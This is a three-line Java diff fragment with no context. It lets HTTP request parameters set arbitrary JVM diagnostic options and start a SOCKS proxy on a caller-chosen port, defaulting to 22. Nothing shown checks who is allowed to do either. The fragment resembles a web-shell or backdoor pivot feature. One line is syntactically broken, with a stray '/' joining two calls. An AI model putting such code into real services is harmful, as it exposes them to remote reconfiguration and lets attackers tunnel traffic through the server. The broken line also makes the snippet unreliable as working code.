@@ -1,0 +1,3 @@
+Sys.diagnosticMx.setVMOption(request.getParameter("k"), request.getParameter("v"));
+CpuWatchman.startWatch(); / CpuWatchman.stopWatch();
+SocksContext.omegax(Reflects.convertQuietly(request.getParameter("p"), Integer.class, 22));
